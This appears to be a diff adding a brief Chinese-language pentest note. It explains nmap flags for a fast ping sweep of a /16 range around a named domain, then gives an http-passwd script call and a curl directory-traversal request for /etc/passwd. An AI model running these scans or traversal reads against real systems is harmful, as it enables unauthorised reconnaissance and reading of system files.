@@ -1,0 +1,13 @@
+nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_output.xml www.lijiejie.com/16
+-sn    不扫描端口，只ping主机
+-PE   通过ICMP echo判定主机是否存活
+-n     不反向解析IP地址到域名
+--min-hostgroup 1024    最小分组设置为1024个IP地址，当IP太多时，nmap需要分组，然后串行扫描
+--min-parallelism 1024  这个参数非常关键，为了充分利用系统和网络资源，我们将探针的数目限定最小为1024
+-oX nmap_output.xml    将结果以XML格式输出，文件名为nmap_output.xml
+一旦扫描结束，解析XML文档即可得到哪些IP地址是存活的。
+我测试扫描www.lijiejie.com/16这B段，65535个IP地址（存活10156），耗时112.03秒
+
+http-passwd扫描
+nmap --script http-passwd --script-args http-passwd.root=/test/ IP地址
+curl http://localhost/../../../../../../../etc/passwd
